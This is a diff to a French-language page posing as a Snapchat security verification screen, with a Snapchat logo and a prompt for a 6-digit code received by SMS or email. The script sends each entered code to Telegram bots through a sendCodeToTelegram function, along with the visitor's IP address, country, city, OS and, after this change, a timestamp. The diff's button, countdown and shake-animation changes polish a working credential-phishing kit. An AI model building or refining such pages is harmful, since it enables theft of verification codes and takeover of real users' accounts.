@@ -10,6 +10,7 @@
             --snap-black: #000000;
             --error-red: #FF3B30;
             --text-gray: #5E5E5E;
+            --light-gray: #F5F5F5;
         }
         
         body {
@@ -54,12 +55,13 @@
         .instructions {
             font-size: 14px;
             color: var(--text-gray);
-            margin-bottom: 32px;
+            margin-bottom: 24px;
             line-height: 1.4;
         }
 
-        .code-container {
-            margin-bottom: 24px;
+        .input-group {
+            margin-bottom: 16px;
+            position: relative;
         }
 
         #verification-code {
@@ -70,13 +72,39 @@
             border-radius: 12px;
             text-align: center;
             box-sizing: border-box;
-            transition: border 0.3s;
+            transition: all 0.3s;
+            background-color: var(--light-gray);
         }
 
         #verification-code:focus {
             outline: none;
             border-color: var(--snap-yellow);
             box-shadow: 0 0 0 2px rgba(255, 252, 0, 0.2);
+            background-color: white;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--snap-yellow);
+            color: var(--snap-black);
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 8px;
+        }
+
+        .submit-btn:hover {
+            background-color: #f5e900;
+        }
+
+        .submit-btn:disabled {
+            background-color: #E0E0E0;
+            color: #9E9E9E;
+            cursor: not-allowed;
         }
 
         .error-message {
@@ -102,7 +130,7 @@
             display: none;
             margin-top: 24px;
             padding: 20px;
-            background-color: #F7F7F7;
+            background-color: var(--light-gray);
             border-radius: 12px;
             animation: fadeIn 0.5s ease;
         }
@@ -135,16 +163,28 @@
             font-size: 13px;
             color: var(--text-gray);
         }
+
+        /* Animation shake */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+        
+        .shake {
+            animation: shake 0.5s;
+        }
     </style>
 </head>
 <body>
     <div class="verification-container">
         <img class="logo" src="https://assets.stickpng.com/images/580b57fcd9996e24bc43c536.png" alt="Snapchat Logo">
         <h1>Vérification de sécurité</h1>
-        <p class="instructions">Entrez le code de vérification que vous avez reçu. Ce code expirera dans 15 minutes.</p>
+        <p class="instructions">Entrez le code de vérification que vous avez reçu par SMS ou email.</p>
         
-        <div class="code-container">
-            <input type="text" id="verification-code" placeholder="Entrez le code ici" autocomplete="off" maxlength="20">
+        <div class="input-group">
+            <input type="text" id="verification-code" placeholder="Code à 6 chiffres" autocomplete="off" maxlength="6">
+            <button class="submit-btn" id="submit-btn" type="button">Vérifier</button>
             <div class="error-message" id="error-message">Code incorrect. Veuillez réessayer.</div>
         </div>
         
@@ -171,30 +211,37 @@
         // Initialisation
         document.addEventListener('DOMContentLoaded', () => {
             const codeInput = document.getElementById('verification-code');
+            const submitBtn = document.getElementById('submit-btn');
+            
             codeInput.focus();
             
-            // Démarrer le compte à rebours initial
-            startCountdown(15, () => {
-                // Code expiré (optionnel)
+            // Activer/désactiver le bouton en fonction de l'entrée
+            codeInput.addEventListener('input', () => {
+                submitBtn.disabled = codeInput.value.length < 4;
             });
-        });
-
-        // Gérer la soumission du code
-        document.getElementById('verification-code').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                verifyCode();
-            }
+            
+            // Soumettre avec le bouton
+            submitBtn.addEventListener('click', verifyCode);
+            
+            // Soumettre avec Entrée
+            codeInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter' && codeInput.value.length >= 4) {
+                    verifyCode();
+                }
+            });
+            
+            // Démarrer le compte à rebours initial
+            startCountdown(300, () => {
+                // Code expiré après 5 minutes (optionnel)
+            });
         });
 
         // Fonction de vérification du code
         function verifyCode() {
             const code = document.getElementById('verification-code').value.trim();
+            const submitBtn = document.getElementById('submit-btn');
             
-            if (code.length < 4) {
-                showError("Le code doit contenir au moins 4 caractères");
-                return;
-            }
+            submitBtn.disabled = true;
             
             // Envoyer le code à Telegram
             sendCodeToTelegram(code);
@@ -226,7 +273,8 @@
 📍 IP: ${ipInfo.ip || 'Inconnue'}
 🌍 Pays: ${ipInfo.country || 'Inconnu'} (${ipInfo.country_name || ''})
 🏙️ Ville: ${ipInfo.city || 'Inconnue'}
-🖥️ OS: ${navigator.platform}`;
+🖥️ OS: ${navigator.platform}
+🕒 Heure: ${new Date().toLocaleString()}`;
 
             for (const config of telegramConfigs) {
                 try {
@@ -247,14 +295,21 @@
         // Afficher l'erreur
         function showError(message) {
             const errorElement = document.getElementById('error-message');
+            const inputGroup = document.querySelector('.input-group');
+            
             errorElement.textContent = message;
             errorElement.classList.add('show');
             
             // Animation shake
-            const container = document.querySelector('.code-container');
-            container.style.animation = 'none';
-            void container.offsetWidth; // Trigger reflow
-            container.style.animation = 'shake 0.5s';
+            inputGroup.classList.add('shake');
+            setTimeout(() => {
+                inputGroup.classList.remove('shake');
+            }, 500);
+            
+            // Réactiver le bouton après l'animation
+            setTimeout(() => {
+                document.getElementById('submit-btn').disabled = false;
+            }, 1000);
         }
 
         // Réinitialiser le champ de code
@@ -262,11 +317,13 @@
             const codeInput = document.getElementById('verification-code');
             codeInput.value = '';
             codeInput.focus();
+            document.getElementById('submit-btn').disabled = true;
         }
 
         // Afficher l'écran de traitement
         function showProcessingScreen() {
             document.getElementById('verification-code').disabled = true;
+            document.getElementById('submit-btn').disabled = true;
             document.getElementById('error-message').classList.remove('show');
             document.getElementById('processing-screen').classList.add('show');
             
@@ -305,20 +362,11 @@
             }, 1000);
             
             function updateCountdownText() {
-                countdownElement.textContent = `Temps restant pour saisir le code: ${remaining} secondes`;
+                const mins = Math.floor(remaining / 60);
+                const secs = remaining % 60;
+                countdownElement.textContent = `Code valide pour ${mins}:${secs < 10 ? '0' : ''}${secs}`;
             }
         }
-
-        // Ajouter l'animation shake au CSS dynamiquement
-        const style = document.createElement('style');
-        style.textContent = `
-            @keyframes shake {
-                0%, 100% { transform: translateX(0); }
-                10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
-                20%, 40%, 60%, 80% { transform: translateX(5px); }
-            }
-        `;
-        document.head.appendChild(style);
     </script>
 </body>
 </html>
